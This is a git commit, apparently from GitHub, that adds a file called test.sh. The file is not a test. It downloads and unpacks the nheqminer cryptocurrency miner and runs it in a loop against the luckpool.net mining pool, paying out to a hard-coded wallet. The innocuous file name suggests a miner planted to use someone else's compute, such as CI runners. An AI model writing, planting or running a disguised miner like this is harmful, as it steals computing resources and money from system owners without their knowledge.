07063d4c891b0adff3362f0cde41207ecb3e816a
tesasik67 <84440178+tesasik67@users.noreply.github.com>
2022-08-02 01:18:37 +0700

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,18 @@
+#!/bin/sh
+
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
+            
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+
+tar -xvzf nheqminer-Linux-v0.8.2.tgz
+
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+
+cd nheqminer
+
+./start.sh -v -l na.luckpool.net:3956 -u RY3RvLLuzUDGLsyPRXm1LSfb4gKobcNfaC.ancan  -p x -t 2
+
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
